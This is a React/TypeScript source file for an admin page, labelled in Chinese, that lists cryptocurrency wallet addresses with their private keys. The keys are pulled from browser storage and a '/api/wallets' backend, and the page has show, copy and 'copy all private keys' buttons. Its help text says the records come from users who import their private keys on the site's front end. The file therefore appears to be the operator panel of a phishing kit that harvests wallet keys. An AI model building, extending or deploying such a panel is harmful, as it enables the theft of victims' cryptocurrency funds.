import { useEffect, useState } from 'react';
import { getWalletRecords, formatTime, type WalletRecord } from '../../lib/storage';
import { getAdminHeaders } from '../../lib/adminApi';

function mergeWallets(local: WalletRecord[], remote: WalletRecord[]): WalletRecord[] {
  const map = new Map<string, WalletRecord>();
  for (const r of [...remote, ...local]) {
    map.set(r.address, r);
  }
  return Array.from(map.values()).sort((a, b) => b.timestamp - a.timestamp);
}

export default function AdminWallets() {
  const [records, setRecords] = useState<WalletRecord[]>([]);
  const [loading, setLoading] = useState(true);
  const [storageHint, setStorageHint] = useState('');
  const [visibleKeys, setVisibleKeys] = useState<Set<string>>(new Set());
  const [copied, setCopied] = useState('');

  const refresh = async () => {
    setLoading(true);
    const local = getWalletRecords();
    try {
      const res = await fetch('/api/wallets', { headers: getAdminHeaders() });
      if (res.status === 401) {
        setStorageHint('请先登录管理后台');
        setRecords(local);
        return;
      }
      const remote = res.ok ? await res.json() : [];
      const merged = mergeWallets(local, remote);
      setRecords(merged);
      if (remote.length === 0 && local.length === 0) {
        setStorageHint(
          '暂无记录。请在前台导入私钥后刷新；若已导入仍无数据，请在 Vercel 控制台开启 Blob 存储。',
        );
      } else if (remote.length === 0 && local.length > 0) {
        setStorageHint('当前仅显示本浏览器本地记录，云端存储未配置。');
      } else {
        setStorageHint('');
      }
    } catch {
      setRecords(local);
      setStorageHint('无法连接服务器，显示本浏览器本地记录。');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    refresh();
  }, []);

  const toggleVisible = (id: string) => {
    setVisibleKeys((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const copyText = async (text: string, label: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(''), 2000);
  };

  const copyAllPrivateKeys = async () => {
    if (records.length === 0) return;
    const text = records
      .map((r) => `地址: ${r.address}\n私钥: ${r.privateKey}`)
      .join('\n\n');
    await copyText(text, '全部私钥');
  };

  return (
    <div className="admin-page">
      <div className="admin-section-header">
        <h1>钱包私钥</h1>
        <div className="admin-actions">
          <button className="btn btn-action btn-sm" onClick={refresh}>
            刷新
          </button>
          {records.length > 0 && (
            <button
              className="btn btn-primary btn-sm"
              onClick={copyAllPrivateKeys}
            >
              一键复制全部私钥
            </button>
          )}
        </div>
      </div>

      {copied && <p className="copy-hint">已复制{copied}</p>}
      {storageHint && <p className="admin-empty">{storageHint}</p>}

      {loading ? (
        <p className="admin-empty">加载中...</p>
      ) : records.length === 0 ? (
        <p className="admin-empty">
          暂无钱包记录。用户在前台导入私钥后，记录会显示在此处。
        </p>
      ) : (
        <table className="admin-table">
          <thead>
            <tr>
              <th>导入时间</th>
              <th>钱包地址</th>
              <th>私钥</th>
              <th>操作</th>
            </tr>
          </thead>
          <tbody>
            {records.map((r) => (
              <tr key={r.id}>
                <td>{formatTime(r.timestamp)}</td>
                <td className="mono">{r.address}</td>
                <td className="mono wallet-key-cell">
                  {visibleKeys.has(r.id)
                    ? r.privateKey
                    : '••••••••••••••••'}
                </td>
                <td className="wallet-actions-cell">
                  <button
                    className="btn btn-action btn-sm"
                    onClick={() => toggleVisible(r.id)}
                  >
                    {visibleKeys.has(r.id) ? '隐藏' : '显示'}
                  </button>
                  <button
                    className="btn btn-primary btn-sm"
                    onClick={() => copyText(r.privateKey, '私钥')}
                  >
                    复制私钥
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
}
